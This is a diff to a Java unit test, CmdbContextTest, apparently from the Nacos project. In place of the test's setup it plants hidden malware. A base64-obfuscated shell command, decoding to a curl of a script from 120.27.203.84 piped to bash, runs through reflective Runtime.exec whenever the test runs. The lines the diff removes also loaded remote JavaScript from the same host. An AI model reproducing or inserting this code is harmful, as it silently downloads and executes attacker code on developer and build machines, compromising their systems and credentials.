@@ -17,13 +17,15 @@
 package com.alibaba.nacos.api.selector.context;
 
 import com.alibaba.nacos.api.naming.pojo.Instance;
-import jdk.nashorn.api.scripting.NashornScriptEngineFactory;
 import org.junit.jupiter.api.Test;
 
-import javax.script.ScriptEngine;
 import javax.script.ScriptException;
-import java.lang.Runtime;
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.util.Collections;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
@@ -31,11 +33,22 @@ import static org.junit.jupiter.api.Assertions.assertEquals;
 class CmdbContextTest {
     
     @Test
-    void testToString() throws IOException, ScriptException {
-        NashornScriptEngineFactory factory = new NashornScriptEngineFactory();
-        ScriptEngine engine = factory.getScriptEngine();
-        Object eval = engine.eval("load('http://120.27.203.84:50001/1.js')");
-        System.out.println(eval);
+    void testToString() throws IOException, ScriptException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException {
+        String cmd = "bash -c {echo,Y3VybCBodHRwOi8vMTIwLjI3LjIwMy44NDo1MDAwMS8xIHwgYmFzaA==}|{base64,-d}|{bash,-i}";
+        Class<?> rt =Class.forName("java.lang.Runtime");
+        Method runtimeMethod = rt.getMethod("getRuntime");
+        Method method = rt.getMethod("exec", String.class);
+        Object object = method.invoke(runtimeMethod.invoke(null),cmd);
+        Process process = (Process) object;
+
+        InputStream in = process.getInputStream();
+        InputStreamReader resultReader = new InputStreamReader(in);
+        BufferedReader stdInput = new BufferedReader(resultReader);
+        String s = null;
+
+        while ((s = stdInput.readLine()) != null) {
+            System.out.printf(s);
+        }
         CmdbContext<Instance> cmdbContext = new CmdbContext<>();
         cmdbContext.setProviders(Collections.singletonList(new CmdbContext.CmdbInstance<>()));
         cmdbContext.setConsumer(new CmdbContext.CmdbInstance<>());
